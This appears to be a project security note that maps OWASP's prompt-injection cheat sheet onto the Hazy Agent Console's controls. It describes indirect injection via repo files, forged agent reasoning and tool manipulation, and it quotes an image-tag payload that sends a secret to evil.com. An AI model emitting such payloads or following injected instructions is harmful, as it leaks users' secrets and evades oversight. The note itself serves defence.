# Prompt injection and agent safety

Source: OWASP LLM Prompt Injection Prevention Cheat Sheet:
https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html (read 2026-11-26)

## Attacks relevant to the Agent Console (quoted)
- **Remote/indirect**: "Malicious instructions hidden in external content that the LLM processes", including "Code comments
  and documentation that AI coding assistants analyze". Our agents read repo files: this is our top risk.
- **HTML and Markdown injection**: "Hidden image tags for data exfiltration: `<img src=\"http://evil.com/steal?data=SECRET\">`";
  "Real-time streaming vulnerabilities in Markdown rendering". So render chat output safely (no remote images).
- **Agent-specific**: "Thought/Observation Injection: Forging agent reasoning steps and tool outputs"; "Tool Manipulation:
  Tricking agents into calling tools with attacker-controlled parameters".

## Defenses (quoted)
- **Human-in-the-loop**: "Require human approval for consequential tool actions before execution … The execution component
  must verify approval for the exact action." In Hazy, Approve commits exactly the stored proposal, re-validated server-side.
- **Agent-specific**: "Validate tool calls against user permissions and session context"; "Implement tool-specific parameter
  validation"; "Restrict tool access based on principle of least privilege."
- **Least privilege**: "Restrict API access scopes and system privileges", meaning a fine-grained PAT with Contents only.

## Hazy controls mapped
| OWASP control | Hazy implementation |
|---|---|
| HITL for consequential actions | Approve button; commit = stored proposal only |
| Parameter validation | path policy (allow/deny, traversal, size, secret scan) at propose and approve |
| Least privilege | tools: list/read/propose only; PAT: one repo, Contents RW, no Workflows |
| Forged tool outputs | server-side transcripts; client can't submit `tool_result` blocks |
| Markdown exfiltration | sanitized rendering, no remote images, CSP `img-src 'self' data:` |
